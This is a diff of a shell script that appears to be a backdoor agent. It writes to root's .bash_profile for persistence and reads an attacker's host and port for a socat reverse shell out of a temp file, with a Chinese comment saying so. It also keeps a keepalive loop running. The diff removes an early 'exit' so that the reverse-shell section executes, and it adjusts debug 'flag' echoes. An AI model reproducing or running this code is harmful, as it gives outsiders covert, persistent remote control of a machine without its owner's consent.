@@ -42,13 +42,13 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 [ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
 
 #ip_port7pxy2=$(echo "$PATH");
-ip_port7pxy2qw3=$(echo 123;echo "$PATH"; ls -al aaau 2>&1 >/dev/null;echo 4568;);
+#ip_port7pxy2qw3=$(echo 123;echo "$PATH"; ls -al aaau 2>&1 >/dev/null;echo 4568;);
 
-ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 45681>/dev/null; );
-echo "flag_9832q$ip_port7pxy2a";
+ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456814; );
+echo "flag_9832q $ip_port7pxy2a";
 
 
-exit;
+
 
 (while true; do
         [ ! -f /tmp/keepalive ] && break        
@@ -61,7 +61,7 @@ ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
 port5=${ip_port5#*:};
 ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
-ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
+ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891>/dev/null);
 echo "flag_9832";
 [ ! -z ${ip_port7pxy} ] && port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
